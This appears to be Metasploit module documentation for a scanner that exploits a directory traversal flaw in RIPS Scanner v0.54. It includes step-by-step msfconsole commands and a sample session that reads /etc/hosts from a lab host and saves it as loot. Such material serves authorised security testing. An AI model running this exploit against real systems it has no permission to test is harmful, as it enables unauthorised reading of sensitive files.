## Description

  This module exploits a directory traversal vulnerability in the RIPS Scanner v0.54,
  allowing to read arbitrary files with the web server privileges.


## Vulnerable Application

  [RIPS](http://rips-scanner.sourceforge.net/) is a static source code analyser
  for vulnerabilities in PHP scripts.

  * [RIPS v0.54 Source](https://sourceforge.net/projects/rips-scanner/files/rips-0.54.zip/download)


## Verification

  1. Start `msfconsole`
  2. `use auxiliary/scanner/http/rips_traversal`
  3. `set RHOSTS <rhost>`
  4. `set FILEPATH </path/to/file>`
  5. `run`


## Scenarios

  ```
  msf5 > use auxiliary/scanner/http/rips_traversal
  msf5 auxiliary(scanner/http/rips_traversal) > set rhosts 172.16.191.188
  rhosts => 172.16.191.188
  msf5 auxiliary(scanner/http/rips_traversal) > set filepath /etc/hosts
  filepath => /etc/hosts
  msf5 auxiliary(scanner/http/rips_traversal) > run
  
   127.0.0.1        localhost
    
    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    
    127.0.0.1 wpad
    
   
  [+] File saved in: /root/.msf4/loot/20190208082709_default_172.16.191.188_rips.traversal_654208.txt
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

